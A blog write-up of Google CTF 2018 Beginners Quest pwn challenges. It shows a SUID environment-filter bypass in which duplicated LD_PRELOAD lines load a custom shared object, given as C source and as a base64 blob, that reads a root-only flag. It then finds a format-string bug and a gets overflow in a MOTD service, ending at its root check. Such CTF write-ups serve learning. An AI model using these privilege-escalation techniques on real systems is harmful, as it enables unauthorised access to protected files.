---
layout: single
title: "Google CTF (2018): Beginners Quest - PWN Solutions (2/2)"
header:
  overlay_image: google-ctf-banner.jpg
related: true
comments: true
---

In my previous post "[Google CTF (2018): Beginners Quest - PWN Solutions (1/2)](https://jhalon.github.io/2018-google-ctf-beginners-pwn-solutions-1/)", we covered the first set of PWN solutions for the Beginners Quest, which touched on topics such as code injection, reverse engineering, [buffer overflows](https://www.owasp.org/index.php/Buffer_Overflow), and [format string exploits](https://www.owasp.org/index.php/Format_string_attack).

In this post, we will continue our journey into the world of pwnage and exploitation. The final set of PWN solutions will cover topics such as [race conditions](https://en.wikipedia.org/wiki/Race_condition), [out-of-bound reads](https://cwe.mitre.org/data/definitions/125.html), [write-what-where](https://cwe.mitre.org/data/definitions/123.html) conditions, and of course more buffer overflows.

Now, before I delve too deep into these topics and solutions I need to put out a fair warning. These challenges were meant for beginners, and truthfully they're pretty easy once you have a decent understanding of buffer overflows, exploitation, and code review, especially when you know what's going on in the application. The only issue I encountered with this part of the solutions is that you really needed to spend a ton of time Googling and learning about Linux internals, shared libraries, memory offsets and more.

If you're unfamiliar with what I mentioned above, then I suggest you go look at the resources I shared in my previous posts to learn about these topics. As always, I'll try to explain the best I can and provide links to external resources, but I highly suggest some previous experience and knowledge in exploitation before delving deep into these solutions.

With that being said, let's cut to the chase and dive right in!

## Filter Env

<p align="center"><a href="/images/gctf18-pwn2-1.png"><img src="/images/gctf18-pwn2-1.png"></a></p>

After reading the challenge description we learn that from our previous exploit we found the credentials for the Smartfridge2000, but we aren't able to read the file, only the root user can. We also learn that there is a weird [SUID](https://www.linux.com/blog/what-suid-and-how-set-suid-linuxunix) binary that looks like we can exploit, so we will do just that!

First things first, let's connect to the `env.ctfcompetition.com` server on port `1337` via netcat to see what we have to work with.

```console
root@kali:~/Google-CTF/Filter Env# nc env.ctfcompetition.com 1337
ls -al
total 76
drwxr-xr-x  21 user   user    4096 Oct 24 19:10 .
drwxr-xr-x  21 user   user    4096 Oct 24 19:10 ..
-rwxr-xr-x   1 nobody nogroup    0 Oct 24 19:04 .dockerenv
drwxr-xr-x   2 nobody nogroup 4096 Apr 17  2018 bin
drwxr-xr-x   2 nobody nogroup 4096 Apr 12  2016 boot
drwxr-xr-x   4 nobody nogroup 4096 Oct 24 19:04 dev
drwxr-xr-x  42 nobody nogroup 4096 Oct 24 19:04 etc
drwxr-xr-x   4 nobody nogroup 4096 Jun  6  2018 home
drwxr-xr-x   8 nobody nogroup 4096 Sep 13  2015 lib
drwxr-xr-x   2 nobody nogroup 4096 Apr 17  2018 lib64
drwxr-xr-x   2 nobody nogroup 4096 Apr 17  2018 media
drwxr-xr-x   2 nobody nogroup 4096 Apr 17  2018 mnt
drwxr-xr-x   2 nobody nogroup 4096 Apr 17  2018 opt
dr-xr-xr-x 111 nobody nogroup    0 Feb  9 21:41 proc
drwx------   2 nobody nogroup 4096 Apr 17  2018 root
drwxr-xr-x   5 nobody nogroup 4096 Apr 17  2018 run
drwxr-xr-x   2 nobody nogroup 4096 Apr 27  2018 sbin
drwxr-xr-x   2 nobody nogroup 4096 Apr 17  2018 srv
drwxr-xr-x   2 nobody nogroup 4096 Feb  5  2016 sys
drwxrwxrwt   2 user   user      40 Feb  9 21:41 tmp
drwxr-xr-x  10 nobody nogroup 4096 Apr 17  2018 usr
```

Nothing too interesting in the root folder, let's see what's in the home folders.

```console
cd /home
ls -la
total 16
drwxr-xr-x  4 nobody nogroup 4096 Jun  6  2018 .
drwxr-xr-x 21 user   user    4096 Oct 24 19:10 ..
drwxr-xr-x  2 nobody nogroup 4096 Jun 14  2018 adminimum
drwxr-xr-x  3 nobody nogroup 4096 Jun 14  2018 user
cd adminimum
ls -la
total 40
drwxr-xr-x 2 nobody    nogroup    4096 Jun 14  2018 .
drwxr-xr-x 4 nobody    nogroup    4096 Jun  6  2018 ..
-rw-r--r-- 1 nobody    nogroup     220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 nobody    nogroup    3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 nobody    nogroup     655 May 16  2017 .profile
-rwsr-xr-x 1 adminimum adminimum 13648 Jun 14  2018 filterenv
-r-------- 1 adminimum adminimum    19 May 24  2018 flag
```

Okay, so we see that the `adminimum` user has the flag file and an interesting binary named `filterenv`. Let's see what happens when we execute the binary.

```console
./filterenv
[*] waiting for new environment
test
test
test
test
test

/bin/bash: line 6:     6 Segmentation fault      (core dumped) ./filterenv
``` 

Segmentation fault? Interesting, I wonder if we can exploit this to get a shell as the user to read the flag. At the same time I notice that the application is waiting for a new environment, so I'm guessing this also has something to do with [environmental variables](https://wiki.debian.org/EnvironmentVariables).

Alright, with that in mind let's go ahead and download the attachment, and extract the files. We should then be presented with the following C code.

```console
root@kali:~/Google-CTF/Filter Env# ls
filterenv.c
root@kali:~/Google-CTF/Filter Env# file filterenv.c 
filterenv.c: C source, ASCII text
```

Upon opening the source code, we are presented with the following.

```c
#include <err.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;
static char *unsafe[] = {
  "GCONV_PATH\x00",
  "GETCONF_DIR\x00",
  "HOSTALIASES\x00",
  "LD_AOUT_LIBRARY_PATH\x00",
  "LD_AOUT_PRELOAD\x00",
  "LD_AUDIT\x00",
  "LD_DEBUG\x00",
  "LD_DEBUG_OUTPUT\x00",
  "LD_DYNAMIC_WEAK\x00",
  "LD_LIBRARY_PATH\x00",
  "LD_ORIGIN_PATH\x00",
  "LD_PRELOAD\x00",
  "LD_PROFILE\x00",
  "LD_SHOW_AUXV\x00",
  "LD_USE_LOAD_BIAS\x00",
  "LOCALDOMAIN\x00",
  "LOCPATH\x00",
  "MALLOC_TRACE\x00",
  "NIS_PATH\x00",
  "NLSPATH\x00",
  "RESOLV_HOST_CONF\x00",
  "RES_OPTIONS\x00",
  "TMPDIR\x00",
  "TZDIR\x00",
  NULL,
};

static int lol(const void *a, const void *b)
{
  if ((unsigned long)a == (unsigned long)b)
    return 0;
  else if ((unsigned long)a > (unsigned long)b)
    return 1;
  else
    return -1;
}

static void shuffle(void)
{
  unsigned int n;
  char **q;

  n = 0;
  for (q = environ; *q != NULL; q++)
    n++;

  qsort(environ, n, sizeof(char *), lol);
}

/* reset unsafe variables */
static void filter_env(void)
{
  char **p;

  for (p = unsafe; *p != NULL; p++) {
    if (getenv(*p) != NULL) {
      if (setenv(*p, "", 1) != 0)
	err(1, "setenv");
    }
  }

  /* just be safe, prevent heap spraying attacks */
  shuffle();
}

static char **readenv(void)
{
  char **env = NULL;
  char line[1024];
  size_t len, n;

  n = 0;
  while (1) {
    if (fgets(line, sizeof(line), stdin) == NULL)
      break;

    len = strlen(line);
    if (len <= 1) {
      break;
    }

    if (++n > 32)
      errx(1, "can't allocate that much variables");

    env = realloc(env, n*sizeof(char*));
    if (env == NULL)
      err(1, "realloc");

    if (len > 0 && line[len-1] == '\n')
      line[len-1] = '\x00';

    env[n-1] = strdup(line);
    if (env[n-1] == NULL)
      err(1, "strdup");
  }

  if (env == NULL)
    errx(1, "no variable set\n");

  return env;
}

static void set_new_env(void)
{
  char **env;

  printf("[*] waiting for new environment\n");
  env = readenv();

  if (clearenv() != 0)
    err(1, "clearenv");

  environ = env;
  filter_env();
}

int main(void)
{
  char *arg[] = { "/usr/bin/id", NULL };

  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  if (setreuid(geteuid(), geteuid()) != 0)
    err(1, "setreuid");

  set_new_env();

  if (execvp(arg[0], arg) != 0)
    err(1, "execvp");

  /* never reached */
  return 0;
}
```

Looking into the main function of the application we see that it does a few things. It set's the real and effective user ID's to `root` via [setreuid](https://linux.die.net/man/2/setreuid) and then it calls the `  set_new_env()` function.

Let's see what that function does.

```c
static void set_new_env(void)
{
  char **env;

  printf("[*] waiting for new environment\n");
  env = readenv();

  if (clearenv() != 0)
    err(1, "clearenv");

  environ = env;
  filter_env();
}
```

From here the application prints out the "waiting for..." line as we've seen already, sets the output of the `readenv()` function to a new variable called `env`. It then clears the environment via the `clearenv()` function, sets the `env` variable to the [libc](https://en.wikipedia.org/wiki/C_standard_library) global variable [environ](https://www.gnu.org/software/libc/manual/html_node/Environment-Access.html), and finally filters the environmental variables via the `filter_env` function.

Okay, let's see what the `readenv` function does to get a better understanding of the application as a whole.

```c
static char **readenv(void)
{
  char **env = NULL;
  char line[1024];
  size_t len, n;

  n = 0;
  while (1) {
    if (fgets(line, sizeof(line), stdin) == NULL)
      break;

    len = strlen(line);
    if (len <= 1) {
      break;
    }

    if (++n > 32)
      errx(1, "can't allocate that much variables");

    env = realloc(env, n*sizeof(char*));
    if (env == NULL)
      err(1, "realloc");

    if (len > 0 && line[len-1] == '\n')
      line[len-1] = '\x00';

    env[n-1] = strdup(line);
    if (env[n-1] == NULL)
      err(1, "strdup");
  }

  if (env == NULL)
    errx(1, "no variable set\n");

  return env;
}
```

From the top, the function reads in a line via the following code: `if (fgets(line, sizeof(line), stdin) == NULL)`, with each line being 1024 bytes as per `char line[1024]`.

The code seems to prevent allocation of more then 32 lines of environmental variables via the following if function: `if (++n > 32)` .

It then allocates space on the heap for the whole `env` variable via `env = realloc(env, n*sizeof(char*));` which is just an array of character pointers or strings. The string are added to the array via `env[n-1] = strdup(line)`.

Pretty much this loops and resizes the data in the heap for each new string via the [realloc](https://www.tutorialspoint.com/c_standard_library/c_function_realloc.htm) function call.

From here is seems that these strings of environmental variables will be passed into something like [execve](http://man7.org/linux/man-pages/man2/execve.2.html). BUT, take note of the following in the manual page.

> The _argv_ and _envp_ arrays must each include a null pointer at the end of the array.

But if we look into the code, we see that there is no NULL terminator is being added to the end of the environmental variable array. 

If we look deeper into the code for the `filter_env` function we will notice where the bug can be exploited.

```c
static void filter_env(void)
{
  char **p;

  for (p = unsafe; *p != NULL; p++) {
    if (getenv(*p) != NULL) {
      if (setenv(*p, "", 1) != 0)
	err(1, "setenv");
    }
  }

  /* just be safe, prevent heap spraying attacks */
  shuffle();
}
```

We can see via the following line of code: `for (p = unsafe; *p != NULL; p++)` that this filter function keeps working till it reaches `NULL`. But there is no NULL terminator!

The code simply get's the environmental variable via [getenv](http://man7.org/linux/man-pages/man3/getenv.3.html) and if it's not NULL, then it set's the environmental variable to an empty string via [setenv](http://man7.org/linux/man-pages/man3/setenv.3.html) if the variable exists in the environment. 

The problem with this is that both the `getnev` and `setenv` functions operate only on a first variable and returns the pointer to the first matching environment variable. This will allow us to provide identical environmental variables which will cause the function to filter the first one, and then load the second one into the environment.

So to exploit this, let's use [LD_PRELOAD](http://www.goldsborough.me/c/low-level/kernel/2016/08/29/16-48-53-the_-ld_preload-_trick/) with a custom C function that will hijack a system call in the application, which once that system function is called, our hijacked function will run and read the flag.

We know that the application calls `/usr/bin/id` in the main function, so let's try hijacking [id](http://man7.org/linux/man-pages/man1/id.1.html).

We will use [ltrace](http://man7.org/linux/man-pages/man1/ltrace.1.html) against the `id` function to trace the library calls, we can then choose a library call to hijack.

```console
root@kali:~/Google-CTF/Filter Env# ltrace id | head
is_selinux_enabled(1, 0x7ffca5dbbbc8, 0x7ffca5dbbbd8, 0x7f7cb3e98718)                                     = 0
strrchr("id", '/')                                                                                        = nil
setlocale(LC_ALL, "")                                                                                     = "en_US.UTF-8"
bindtextdomain("coreutils", "/usr/share/locale")                                                          = "/usr/share/locale"
textdomain("coreutils")                                                                                   = "coreutils"
```

Right away I notice that the C function call [strrchr](https://www.tutorialspoint.com/c_standard_library/c_function_strrchr.htm) is being used, so let's hijack that function.

Simply let's build a [Shared Object](https://superuser.com/questions/71404/what-is-an-so-file) file with the following contents that will be used for the LD_PRELOAD. The C code simply is used to read the flag for us.

```c
#include <stdio.h>
#include <stdlib.h>

void strrchr()
{
	FILE *fptr = fopen("/home/adminimum/flag", "rb");
	char c = fgetc(fptr);
	while (c != EOF)
	{
		printf("%c", c);
		c = fgetc(fptr);
	}
	fclose(fptr);
	return 0;
}
```

Once done, let's compile it.

```console
root@kali:~/Google-CTF/Filter Env# gcc -shared exp.c -o exp.so
exp.c:4:6: warning: conflicting types for built-in function ‘strrchr’ [-Wbuiltin-declaration-mismatch]
 void strrchr()
      ^~~~~~~
exp.c: In function ‘strrchr’:
exp.c:14:9: warning: ‘return’ with a value, in function returning void
  return 0;
         ^
exp.c:4:6: note: declared here
 void strrchr()
      ^~~~~~~
```

To transport this file over to the server, we will [gzip](https://www.gnu.org/software/gzip/) the file and then get the base64 output of it. We can then pass the base64 code over to the server, and unzip the file.

```console
root@kali:~/Google-CTF/Filter Env# ls -la
total 32
drwxr-xr-x  2 root root  4096 Feb 24 17:25 .
drwxr-xr-x 12 root root  4096 Feb  8 22:42 ..
-rw-r--r--  1 root root   220 Feb 24 17:24 exp.c
-rwxr-xr-x  1 root root 16136 Feb 24 17:25 exp.so
-rw-r--r--  1 root root  2425 Nov 30  1979 filterenv.c
root@kali:~/Google-CTF/Filter Env# gzip exp.so 
root@kali:~/Google-CTF/Filter Env# ls -la
total 20
drwxr-xr-x  2 root root 4096 Feb 24 17:25 .
drwxr-xr-x 12 root root 4096 Feb  8 22:42 ..
-rw-r--r--  1 root root  220 Feb 24 17:24 exp.c
-rwxr-xr-x  1 root root 2083 Feb 24 17:25 exp.so.gz
-rw-r--r--  1 root root 2425 Nov 30  1979 filterenv.c
root@kali:~/Google-CTF/Filter Env# base64 exp.so.gz | tr -d '\n'
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
```

Once done, let's put this file on the server.

```console
cd /tmp
ls -la
total 4
drwxrwxrwt  2 user user   40 Feb 24 23:28 .
drwxr-xr-x 21 user user 4096 Oct 24 19:10 ..
echo "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" | base64 -d >> exp.so.gz
ls -la
total 8
drwxrwxrwt  2 user user   60 Feb 24 23:35 .
drwxr-xr-x 21 user user 4096 Oct 24 19:10 ..
-rw-r--r--  1 user user 2083 Feb 24 23:35 exp.so.gz
```

On the server we will use [gunzip](https://linux.die.net/man/1/gunzip) to extract the file.

```console
gunzip exp*
ls -la
total 20
drwxrwxrwt  2 user user    60 Feb 24 23:35 .
drwxr-xr-x 21 user user  4096 Oct 24 19:10 ..
-rw-r--r--  1 user user 16136 Feb 24 23:35 exp.so
```

Awesome, from here we can navigate to the `filterenv` binary and execute it with out LD_PRELOAD function. This should give us the flag.

```console
cd /home/adminimum
ls -la
total 40
drwxr-xr-x 2 nobody    nogroup    4096 Jun 14  2018 .
drwxr-xr-x 4 nobody    nogroup    4096 Jun  6  2018 ..
-rw-r--r-- 1 nobody    nogroup     220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 nobody    nogroup    3771 Aug 31  2015 .bashrc
-rw-r--r-- 1 nobody    nogroup     655 May 16  2017 .profile
-rwsr-xr-x 1 adminimum adminimum 13648 Jun 14  2018 filterenv
-r-------- 1 adminimum adminimum    19 May 24  2018 flag
./filterenv
[*] waiting for new environment
LD_PRELOAD=/tmp/exp.so
LD_PRELOAD=/tmp/exp.so
LD_PRELOAD=/tmp/exp.so
LD_PRELOAD=/tmp/exp.so


CTF{H3ll0-Kingc0p3}
uid=1338(adminimum) gid=1337(user) groups=1337(user)
```

And just like that we got the flag!

__FLAG:__ CTF{H3ll0-Kingc0p3}

## Message of the Day

<p align="center"><a href="/images/gctf18-pwn2-2.png"><img src="/images/gctf18-pwn2-2.png"></a></p>

Upon reading the challenge description we learn that we got access to the Google-Haus smart hub. It seems that the system we are on delivers the ability to print a "Message-of-the-day". Alright, so I'm guessing we need to exploit something with the messages.

Let's connect to the `motd.ctfcompetition.com` server on port `1337` and see what we have to work with.

```console
root@kali:~/Google-CTF/Message Of The Day# nc motd.ctfcompetition.com 1337
Choose functionality to test:
1 - Get user MOTD
2 - Set user MOTD
3 - Set admin MOTD (TODO)
4 - Get admin MOTD
5 - Exit
choice: 
``` 

Alright, we notice that we have a few options - one to set a new message for the user and admin, and another option to print the message of the user and admin.

Let's go through the functionality to see what it does.

```console
root@kali:~/Google-CTF/Message Of The Day# nc motd.ctfcompetition.com 1337
Choose functionality to test:
1 - Get user MOTD
2 - Set user MOTD
3 - Set admin MOTD (TODO)
4 - Get admin MOTD
5 - Exit
choice: 1
MOTD: Welcome back friend!
Choose functionality to test:
1 - Get user MOTD
2 - Set user MOTD
3 - Set admin MOTD (TODO)
4 - Get admin MOTD
5 - Exit
choice: 3
TODO: Allow admin MOTD to be set
Choose functionality to test:
1 - Get user MOTD
2 - Set user MOTD
3 - Set admin MOTD (TODO)
4 - Get admin MOTD
5 - Exit
choice: 4
You're not root!
Choose functionality to test:
1 - Get user MOTD
2 - Set user MOTD
3 - Set admin MOTD (TODO)
4 - Get admin MOTD
5 - Exit
choice: 2
Enter new message of the day
New msg: Testing
New message of the day saved!
Choose functionality to test:
1 - Get user MOTD
2 - Set user MOTD
3 - Set admin MOTD (TODO)
4 - Get admin MOTD
5 - Exit
choice: 1
Testing
Choose functionality to test:
1 - Get user MOTD
2 - Set user MOTD
3 - Set admin MOTD (TODO)
4 - Get admin MOTD
5 - Exit
choice: 2
Enter new message of the day
New msg: %x %x %x
New message of the day saved!
Choose functionality to test:
1 - Get user MOTD
2 - Set user MOTD
3 - Set admin MOTD (TODO)
4 - Get admin MOTD
5 - Exit
choice: 1
1 fffffd7d ffffffda
```

Awesome, so it seems we found a format string vulnerability in reading the message of the day! At the same time it seems we aren't running as root so we can't really set anything for the admin, but that's okay!

Okay with this in mind, let's go ahead and download the attachment and extract the files. We should then be presented with the following binary.

```console
root@kali:~/Google-CTF/Message Of The Day# ls
motd
root@kali:~/Google-CTF/Message Of The Day# file motd 
motd: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=48025612558d041aa5521523e5e98194320d1fa4, not stripped
``` 

From here let's open the binary up in IDA, press `Shift+F12` to pull up the string window and let's look for the "New message of the day saved!" string.

<p align="center"><a href="/images/gctf18-pwn2-3.png"><img src="/images/gctf18-pwn2-3.png"></a></p>

Once found, let's double click that, and in the next window highlight the function, and press `x` to get the cross reference. From there just follow the cross reference of where the string is called from and we should see the following.

<p align="center"><a href="/images/gctf18-pwn2-4.png"><img src="/images/gctf18-pwn2-4.png"></a></p>

Right away I notice that [printf](https://www.tutorialspoint.com/c_standard_library/c_function_printf.htm) is being used, which allows for format string exploits to occur!

But then I notice something else...

<p align="center"><a href="/images/gctf18-pwn2-5.png"><img src="/images/gctf18-pwn2-5.png"></a></p>

Notice that the vulnerable [gets](https://www.tutorialspoint.com/c_standard_library/c_function_gets.htm) function is used, which doesn't check buffer lengths. It seems that the source for our string is set to `100h` or `256` bytes, so if we can overflow the buffer, what can we do?

Well we know that there is option to write a message as admin, so let's dig into that to see if we can't exploit that. We can start by looking for the "You're not root!" string.

<p align="center"><a href="/images/gctf18-pwn2-6.png"><img src="/images/gctf18-pwn2-6.png"></a></p>

From here, simply follow the cross reference and we should see the following.

<p align="center"><a href="/images/gctf18-pwn2-7.png"><img src="/images/gctf18-pwn2-7.png"></a></p>

Right away we can see that this option calls the [getuid](http://man7.org/linux/man-pages/man2/getuid.2.html) function and compares it to `0` or root. If we are root, then the option calls the `read_flag` function and reads our flag, otherwise we get the not root message.

